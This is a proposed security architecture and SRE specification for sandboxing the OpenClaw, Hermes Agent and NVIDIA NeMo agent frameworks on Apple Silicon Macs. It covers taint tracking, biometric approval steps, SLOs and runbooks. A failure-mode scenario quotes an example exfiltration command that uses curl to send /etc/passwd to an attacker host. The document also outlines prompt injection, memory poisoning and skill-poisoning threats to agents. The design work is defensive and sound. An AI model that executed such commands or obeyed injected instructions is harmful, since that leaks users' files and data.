# Feature Investigation & SRE Specification: Autonomous Agent Framework Integration (OpenClaw, Hermes Agent, NVIDIA NeMo)

* **Document ID:** `FS-708` (`DESIGN-AGENTIC-INTEGRATION-2026-008`, Rev 1.1)
* **Generation:** `v3.0-Target` · **Track:** Future Roadmap & Ecosystem Extensibility (Tier 4)
* **Status:** `PROPOSED — ROADMAP SPECIFICATION`
* **Author:** SRE & Enclave Security Architecture
* **Target Baseline:** Apple Silicon Macs (`M1`–`M6+`), macOS 14.0+
* **Normative References:** `FS-701` (Model Runner), `FS-703` (Custody Vault), `FS-704` (Agent Runtime & IFC), `FS-705` (ZK Auditor), `ADR-006` (Mesh Topology), `ADR-013` (hardware quorum; protocol integration remains YKD-12), `FS-703 §11.2` and `FS-704 §11.3` (scoped delegation)

---

## 1. Executive Summary & Problem Definition

### 1.1 The Emerging Agentic Landscape

Autonomous agent architectures are shifting from simple prompt-response wrappers to persistent, tool-using, multi-turn systems. Three prominent paradigms have emerged as ecosystem leaders:

1. **OpenClaw:** A gateway-first autonomous assistant harness designed to connect LLMs directly to consumer messaging channels (WhatsApp, Signal, Telegram, Discord, iMessage). It handles personal workflows, scheduling, local file operations, and external automations.
2. **Hermes Agent (Nous Research):** A self-improving autonomous agent framework featuring persistent cross-session memory and dynamic skill acquisition (the agent inspects task outcomes and authors reusable tool/skill modules).
3. **NVIDIA Agentic Ecosystem (NemoClaw & NeMo Agent Toolkit / NeMo Guardrails):** An enterprise-grade governance and sandboxing layer providing programmable guardrails (Colang), topic boundaries, and execution containment for multi-agent swarms.

### 1.2 The Security & Production Deficit

Running these frameworks natively on macOS developer machines exposes critical enterprise risks:

* **Ambient Shell & Socket Access:** OpenClaw skills and Hermes-generated scripts often execute directly in user space with full ambient authority (`uid 501`).
* **Prompt Injection & Data Exfiltration:** Tainted inputs from public chat channels (WhatsApp/Discord) can hijack tool execution and leak sensitive files over outbound network sockets.
* **Skill Supply-Chain Poisoning:** Self-authored or community skills lack cryptographic provenance and static analysis guarantees.
* **Lack of Hardware Grounding:** Neither framework binds high-impact decisions to hardware biometrics (Touch ID / Secure Enclave) or tamper-evident cryptographic audit ledgers.

---

## 2. Integration Architecture: depot as the Hardware-Anchored Host

depot acts as the **secure execution substrate and hardware governance anchor** for OpenClaw, Hermes Agent, and NVIDIA NeMo, abstracting local Apple Silicon security controls behind standardized interfaces.

```
                  ┌──────────────────────────────────────────────────────────────┐
                  │                 AGENTIC APPLICATION LAYER                    │
                  │  ┌──────────────┐   ┌──────────────┐   ┌───────────────────┐ │
                  │  │   OpenClaw   │   │ Hermes Agent │   │  NVIDIA NemoClaw  │ │
                  │  │ (Chat Apps)  │   │(Self-Learner)│   │ (NeMo Guardrails) │ │
                  │  └──────┬───────┘   └──────┬───────┘   └─────────┬─────────┘ │
                  └─────────┼──────────────────┼─────────────────────┼───────────┘
                            │ (Local UDS / Standard Agent Wire Protocol)         │
                            ▼                  ▼                     ▼           │
 ┌───────────────────────────────────────────────────────────────────────────────┼──────────┐
 │ depot PRIVILEGE-SEPARATED ENCLAVE (v3.0 LaunchDaemons)                       │          │
 │                                                                               │          │
 │   ┌────────────────────────────────────────────────────────────────────────┐  │          │
 │   │ UID 704: enclave-agent-runtime                                         │  │          │
 │   │  • Cedar PDP: Evaluates tool invocations against enterprise policies   │  │          │
 │   │  • Context DAG: Taint tracking across turns & chat channels            │  │          │
 │   │  • Wasmtime Pulley Sandbox: Zero-JIT execution of generated skills     │  │          │
 │   └──────────────────┬─────────────────────────────┬───────────────────────┘  │          │
 │                      │                             │                          │          │
 │                      ▼                             ▼                          │          │
 │   ┌───────────────────────────────────┐ ┌──────────────────────────────────┐  │          │
 │   │ UID 703: enclave-custody-vaultd   │ │ UID 701: enclave-model-runnerd   │  │          │
 │   │  • PoP-Biscuit Ephemeral Grants   │ │  • Local Metal/ANE model weights │  │          │
 │   │  • Step-Up Touch ID / SEP keys    │ │  • PagedAttention KV isolation   │  │          │
 │   │  • UdsEgressGate: pi_redact PII   │ │  • LeftoverLocals VRAM zeroing   │  │          │
 │   └──────────────────┬────────────────┘ └──────────────────┬───────────────┘  │          │
 │                      │                                     │                  │          │
 │                      ▼                                     ▼                  │          │
 │   ┌───────────────────────────────────┐ ┌──────────────────────────────────┐  │          │
 │   │ UID 702: enclave-swarm-syncd      │ │ UID 705: enclave-zk-auditor      │  │          │
 │   │  • Only daemon with WAN IP egress │ │  • Plonky3 STARK compliance roll │  │          │
 │   │  • Content-Addressed skill cache  │ │  • Immutable journal commitments │  │          │
 │   └───────────────────────────────────┘ └──────────────────────────────────┘  │          │
 └───────────────────────────────────────────────────────────────────────────────┴──────────┘
```

---

## 3. Targeted Feature Set by Framework

### 3.1 Feature A: OpenClaw Messaging & Egress Isolation

* **Channel Ingress Sanitization:** Inbound chat payloads (WhatsApp, Signal, Telegram) enter via an isolated adapter socket. The text is tagged as `UntrustedInput` in the **Context DAG** (`context_dag.rs`).
* **Pre-Egress DLP Redaction:** Outgoing agent replies destined for chat networks pass through UID 703's synchronous `UdsEgressGate`. PII is scrubbed and substituted with format-preserving surrogates (`SYNTH-*`).
* **Tool Containment:** OpenClaw plugins are mapped to Wasmtime sandboxed tools with strictly declared file-descriptor capabilities.

### 3.2 Feature B: Hermes Agent Dynamic Skill & Memory Governance

* **Sandboxed Skill Execution:** Hermes dynamic skill scripts (generated Python/WASM) execute inside zero-JIT isolated sandboxes without raw socket access or shell escapes.
* **Persistent Memory Taint Guard:** Memories saved across sessions are checked against the Context DAG to prevent recursive prompt-injection poisoning.
* **Biometric Step-Up for Self-Modification:** When Hermes attempts to register a permanent new skill or execute high-impact local modifications, UID 703 enforces an `A2` or `A3` Touch ID ceremony.

### 3.3 Feature C: NVIDIA NeMo / NemoClaw Enterprise Guardrail Substrate

* **Conjunctive Policy Binding:** NeMo Guardrail Colang flows are mapped directly to Cedar policies enforced by UID 704 (`pdp.rs`), ensuring sub-millisecond evaluation ($p99 \le 45\ \mu\text{s}$).
* **Hardware-Secured Inference:** Model queries route to UID 701 (`enclave-model-runnerd`), ensuring zero VRAM remanence (LeftoverLocals protection) and zero cloud leakage.
* **ZK Compliance Rollup:** All guardrail violations, interventions, and tool actions are proven via UID 705's Plonky3 STARK circuit for verifiable enterprise auditing.

---

## 4. Production SRE Specification

### 4.1 Service Level Indicators (SLIs) & Objectives (SLOs)

| Metric                         | SLI Definition                                                                         | Target SLO                       | Error Budget & Alert                              |
|:-------------------------------|:---------------------------------------------------------------------------------------|:---------------------------------|:--------------------------------------------------|
| **Adapter Latency Overhead**   | P99 latency delta added by enclave IPC mediation vs direct un-sandboxed execution      | $\le 15.0\text{ ms}$ overhead    | Alert if P99 $> 25\text{ ms}$ over 5-min window   |
| **Fail-Closed Execution**      | Percentage of unauthenticated or policy-violating tool executions successfully blocked | $100.00\%$ fail-closed           | **Zero tolerance** (SEV-1 page on any bypass)     |
| **Unattended Task Completion** | Percentage of autonomous background tasks completing without biometric stall           | $\ge 99.5\%$ of valid tasks      | Alert if stall rate $> 1.0\%$ over 1 hour         |
| **Memory Footprint Ceiling**   | Per-agent adapter RSS memory overhead on Apple Silicon unified memory                  | $\le 256\text{ MiB}$ per session | Alert if adapter RSS leaks $> 50\text{ MiB}$/hour |
| **PII Leakage Containment**    | Residual raw PII bytes leaked across outbound communication channels                   | $0\text{ bytes}$                 | **Zero tolerance** (SEV-1 page immediately)       |

### 4.2 Failure Modes & Effects Analysis (FMEA)

* **Scenario 1: Rogue Injected Skill (Hermes / OpenClaw):**
  * *Vector:* Malicious input causes agent to synthesize a script attempting `curl -d @/etc/passwd attacker.com`.
  * *Enclave Defense:* Wasmtime sandbox lacks network sockets; Seatbelt profile restricts filesystem access; UID 702 drops unauthorized IP egress.
* **Scenario 2: Unattended Deadlock on Touch ID:**
  * *Vector:* Background agent stalls indefinitely waiting for interactive biometrics.
  * *Enclave Defense:* Ephemeral PoP-Biscuit delegation grants (`GAP-51`) provide time-bounded authority for pre-approved scopes. If the grant expires, the task suspends gracefully rather than crashing.
* **Scenario 3: Guardrail Desynchronization (NeMo):**
  * *Vector:* Application-layer NeMo guardrail check fails open or crashes.
  * *Enclave Defense:* Enclave Cedar PDP operates out-of-process at the IPC layer. If the client guardrail crashes, UID 704 denies all subsequent tool actions.

---

## 5. SRE Operational Runbooks

### RB-220: Autonomous Agent Taint Alert & Context DAG Quarantine

* **Severity:** SEV-2
* **Trigger:** Context DAG detects tainted input propagation attempting to influence high-privilege tool parameters.
* **Procedure:**
  1. Inspect the tainted node ancestry:

     ```bash
     depot-enclave dag trace --session-id <session_id> --taint-only
     ```

  2. Suspend the agent session and revoke ephemeral delegation tokens:

     ```bash
     depot-enclave custody revoke-lease --session-id <session_id>
     ```

  3. Flush volatile memory buffers in UID 704.

### RB-221: Dynamic Skill Verification Failure & Rollback

* **Severity:** SEV-3
* **Trigger:** An agent-authored skill fails sandbox compilation or static safety checks.
* **Procedure:**
  1. Review quarantine log:

     ```bash
     depot-enclave supervisor logs --grep "SKILL_VERIFICATION_FAILED"
     ```

  2. Reject the uncommitted skill artifact and revert Hermes workspace to last known good snapshot:

     ```bash
     depot-enclave storage rollback --workspace-id <workspace_id>
     ```

---

## 6. Implementation Roadmap

1. **Phase 1 (Adapter Prototypes):** Expose a lightweight loopback bridge (`enclave-agent-bridge`) speaking standard agent wire protocols to UID 704.
2. **Phase 2 (Sandboxed Skill Runner):** Integrate Wasmtime Pulley bindings for dynamic skill execution with capability constraints.
3. **Phase 3 (Enterprise NeMo Binding):** Author Cedar policy translation rules for NeMo Colang rulesets and test end-to-end ZK rollup generation.

## 8. Rev 1.1 authority correction (YKD-15, 2026-11-15)

The former header's ADR-013 scoped-delegation reference was incorrect: ADR-013
is quorum. Scoped delegation is specified by FS-703 §11.2 and FS-704 §11.3.
Framework integrations remain proposed; an application guardrail cannot bypass
service policy/hardware requirements. The implementation handoff
separates design, implementation, model proof, native and installed evidence.

## 2026-11-15 artifact argument validation cleanup evidence

The bounded delivery guards successful parsed private argument strings/object keys and canonical output, including serialization-error prefixes, before ticket issuance. Existing canonical admission and durable ticket/replay/expiry semantics are unchanged. Linux20 and Mac12 focused software cases pass with platform exclusions recorded. These live-allocation checks do not establish parser/history/framework/physical erasure or full-profile qualification.
